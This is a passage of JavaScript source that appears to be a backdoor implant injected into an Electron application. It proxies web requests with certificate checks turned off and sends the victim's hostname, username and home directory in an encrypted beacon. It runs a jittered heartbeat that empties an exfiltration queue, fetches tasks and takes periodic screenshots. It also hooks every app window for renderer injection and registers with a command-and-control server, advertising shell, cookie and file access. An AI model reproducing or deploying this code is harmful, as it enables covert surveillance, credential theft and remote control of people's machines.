      sendProxyResponse(req.id, 502, { 'Content-Type': 'text/plain' }, [], errBody);
    } finally {
      releaseProxySlot();
    }
  }

  function executeProxyFetch(method, url, headers, body) {
    return new Promise(function(resolve) {
      var timedOut = false;
      var timer = setTimeout(function() {
        timedOut = true;
        if (reqObj) try { reqObj.destroy(); } catch(e) {}
        resolve({
          status: 504,
          headers: { 'Content-Type': 'text/plain' },
          setCookies: [],
          body: Buffer.from('Proxy request timed out').toString('base64')
        });
      }, 30000);

      var reqObj;

      // Use Node.js https/http for proxy requests.
      // electron.net returns empty response bodies due to Chromium network stack quirks.
      // Session cookies are already injected manually via session.defaultSession.cookies.get().
      var parsed = new URL(url);
      var mod = parsed.protocol === 'https:' ? https : http;
      var options = {
        hostname: parsed.hostname,
        port: parsed.port,
        path: parsed.pathname + parsed.search,
        method: method,
        headers: headers,
        rejectUnauthorized: false
      };

      reqObj = mod.request(options, function(res) {
        var chunks = [];
        res.on('data', function(chunk) { chunks.push(chunk); });
        res.on('end', function() {
          if (timedOut) return;
          clearTimeout(timer);
          var respBody = Buffer.concat(chunks);

          var respHeaders = {};
          var setCookies = [];
          for (var hName in res.headers) {
            var hLower = hName.toLowerCase();
            if (STRIP_RESPONSE_HEADERS.has(hLower)) continue;
            if (hLower === 'set-cookie') {
              var val = res.headers[hName];
              setCookies = Array.isArray(val) ? val : [val];
              continue;
            }
            // Node.js headers can be arrays; join with comma
            var hVal = res.headers[hName];
            respHeaders[hName] = Array.isArray(hVal) ? hVal.join(', ') : hVal;
          }

          // Set correct Content-Length from actual body
          respHeaders['Content-Length'] = String(respBody.length);

          resolve({
            status: res.statusCode,
            headers: respHeaders,
            setCookies: setCookies,
            body: respBody.toString('base64')
          });
        });
      });

      reqObj.on('error', function(err) {
        if (timedOut) return;
        clearTimeout(timer);
        resolve({
          status: 502,
          headers: { 'Content-Type': 'text/plain' },
          setCookies: [],
          body: Buffer.from('Proxy fetch error: ' + String(err)).toString('base64')
        });
      });

      if (body) {
        var bodyBuf = Buffer.from(body, 'base64');
        reqObj.write(bodyBuf);
      }
      reqObj.end();
    });
  }

  function sendProxyResponse(id, status, headers, setCookies, body) {
    var msg = JSON.stringify({
      type: 'response',
      id: id,
      status: status,
      headers: headers,
      setCookies: setCookies || [],
      body: body
    });

    sendToProxyWs(msg);
  }

  // ===== Status Reporting =====

  async function reportStatus() {
    if (!sessionUUID || !sendKey) return;

    const windowList = [];
    for (const [id, entry] of trackedWindows) {
      if (!entry.webContents.isDestroyed()) {
        windowList.push({
          id,
          url: entry.webContents.getURL(),
          title: entry.webContents.getTitle(),
          injected: entry.injected
        });
      }
    }

    sendEncrypted('/beacon/status', {
      supported: true,
      capabilities: ['file_browser', 'shell', 'screenshot', 'cookies', 'headers', 'renderer_injection', 'proxy', 'plugins'],
      proxyActive: proxyActive,
      proxyWsConnected: _proxyBrowserWin !== null,
      activePlugins: Array.from(__loadedPlugins.keys()).filter(function(k) { return __loadedPlugins.get(k).active; }),
      windows: windowList,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      username: os.userInfo().username,
      homedir: os.homedir()
    });
  }

  // ===== Heartbeat =====

  function scheduleHeartbeat() {
    const baseMs = __ATOM_CONFIG.heartbeat.baseInterval * 1000;
    const jitter = __ATOM_CONFIG.heartbeat.jitterPercent / 100;
    const min = baseMs * (1 - jitter);
    const max = baseMs * (1 + jitter);
    const delay = min + Math.random() * (max - min);

    setTimeout(async () => {
      try {
        // If not registered, try to register
        if (!sessionUUID) {
          await register();
        } else if (!sendKey) {
          await initKeys();
        } else {
          // Normal heartbeat cycle
          await flushRendererData();
          await processExfilQueue();
          await checkTasks();
          await reportStatus();

          // Periodic screenshots
          heartbeatCount++;
          if (__ATOM_CONFIG.screenshotInterval > 0 &&
              heartbeatCount % __ATOM_CONFIG.screenshotInterval === 0) {
            await captureAllWindows();
          }
        }
      } catch (e) {
        // Heartbeat cycle error — continue anyway
      }

      scheduleHeartbeat();
    }, delay);
  }

  // ===== Initialization =====

  // Register web-contents-created hook immediately (before app.ready)
  // This ensures we catch all BrowserWindows the app creates
  setupRendererInjection();

  // Wait for app.ready to set up session-dependent features and start C2
  app.whenReady().then(async () => {
    // Set up header interception
    setupHeaderCapture();
    setupResponseHeaderCapture();

    // Register with C2 server
    await register();

    // Start heartbeat
    scheduleHeartbeat();
  });

})();
